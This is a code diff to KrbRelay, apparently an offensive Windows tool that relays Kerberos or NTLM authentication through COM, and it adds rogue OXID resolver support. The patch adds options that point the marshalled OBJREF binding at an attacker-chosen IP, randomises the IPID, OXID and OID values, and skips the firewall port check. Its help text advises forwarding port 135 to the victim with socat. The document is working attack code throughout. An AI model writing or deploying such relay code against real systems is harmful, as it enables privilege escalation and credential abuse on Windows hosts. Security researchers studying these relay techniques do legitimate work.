@@ -433,6 +433,9 @@ namespace KrbRelay
             Console.WriteLine("-clsid                    Service to be executed in");
             Console.WriteLine("-session                  ID for cross-session marshalling");
             Console.WriteLine("-port                     COM listener port");
+            Console.WriteLine("-rogue <ip>               OBJREF binding -> <ip>:135 (use socat fwd 135 -> victim:<rogue-port>)");
+            Console.WriteLine("-rogue-port <port>        Rogue OXID resolver listen port (default 9999)");
+            Console.WriteLine("-skip-check               Skip HNetCfg.FwMgr.IsPortAllowed pre-check (use raw -port)");
             Console.WriteLine("-llmnr                    LLMNR poisoning");
         }
 
@@ -472,6 +475,9 @@ namespace KrbRelay
             string service = "";
             int sessionID = -123;
             string port = "12345";
+            string rogueIp = "";
+            int roguePort = 9999;
+            bool skipPortCheck = false;
             bool show_help = false;
             bool llmnr = false;
             Guid clsId_guid = new Guid();
@@ -830,7 +836,30 @@ namespace KrbRelay
                     case "/SESSION":
                         sessionID = Int32.Parse(args[entry.index + 1]);
                         break;
+
+                    case "-ROGUE":
+                    case "/ROGUE":
+                        rogueIp = args[entry.index + 1];
+                        break;
+
+                    case "-ROGUE-PORT":
+                    case "/ROGUE-PORT":
+                        roguePort = int.Parse(args[entry.index + 1]);
+                        break;
+
+                    case "-SKIP-CHECK":
+                    case "/SKIP-CHECK":
+                        skipPortCheck = true;
+                        break;
                 }
+            }
+
+            if (rogueIp != "")
+            {
+                ushort svc = ntlm ? (ushort)0x0a : (ushort)0x10;
+                string princ = ntlm ? "" : spn;
+                RogueOxidResolver.Start(roguePort, "127.0.0.1", int.Parse(port), princ, svc);
+                System.Threading.Thread.Sleep(500);
             }
 
             if (show_help)
@@ -1089,7 +1118,7 @@ namespace KrbRelay
 
             //Unable to call other com objects before doing the CoInitializeSecurity step
             //Make sure that we'll use an available port
-            if (!checkPort(int.Parse(port)))
+            if (!skipPortCheck && !checkPort(int.Parse(port)))
             {
                 Console.WriteLine("[*] Looking for available ports..");
                 port = checkPorts(new string[] { "SYSTEM" }).ToString();
@@ -1106,14 +1135,21 @@ namespace KrbRelay
             Console.WriteLine("[*] Register com server");
             byte[] ba = ComUtils.GetMarshalledObject(new object());
             COMObjRefStandard std = (COMObjRefStandard)COMObjRefStandard.FromArray(ba);
-            //Console.WriteLine("[*] IPID: {0}", std.Ipid);
-            //Console.WriteLine("[*] OXID: {0:X08}", std.Oxid);
-            //Console.WriteLine("[*] OID : {0:X08}", std.Oid);
+
+            string bind = rogueIp != "" ? rogueIp : "127.0.0.1";
+            if (rogueIp != "")
+            {
+                var rnd = new Random();
+                byte[] g = new byte[16];
+                rnd.NextBytes(g); std.Ipid = new Guid(g);
+                rnd.NextBytes(g); std.Oxid = BitConverter.ToUInt64(g, 0);
+                rnd.NextBytes(g); std.Oid  = BitConverter.ToUInt64(g, 0);
+                Console.WriteLine("[*] rogue binding -> {0} (socat 135 -> victim:{1})", bind, roguePort);
+            }
+
             std.StringBindings.Clear();
-            std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, "127.0.0.1"));
+            std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, bind));
             Console.WriteLine(std.ToMoniker());
-            //std.SecurityBindings.Clear();
-            //std.SecurityBindings.Add(new COMSecurityBinding(RpcAuthnService.GSS_Kerberos, spn));
 
             RpcServerUseProtseqEp("ncacn_ip_tcp", 20, port, IntPtr.Zero);
             RpcServerRegisterAuthInfo(null, (uint)dwAuthnSvc, IntPtr.Zero, IntPtr.Zero);
@@ -1126,7 +1162,7 @@ namespace KrbRelay
             result = Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);
             Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
             //insert our ObjRef(std) in the StorageTrigger
-            StorageTrigger storageTrigger = new StorageTrigger(storage, "127.0.0.1", TowerProtocol.EPM_PROTOCOL_TCP, std);
+            StorageTrigger storageTrigger = new StorageTrigger(storage, bind, TowerProtocol.EPM_PROTOCOL_TCP, std);
             qis[0].pIID = Ole32.IID_IUnknownPtr;
             qis[0].pItf = null;
             qis[0].hr = 0;
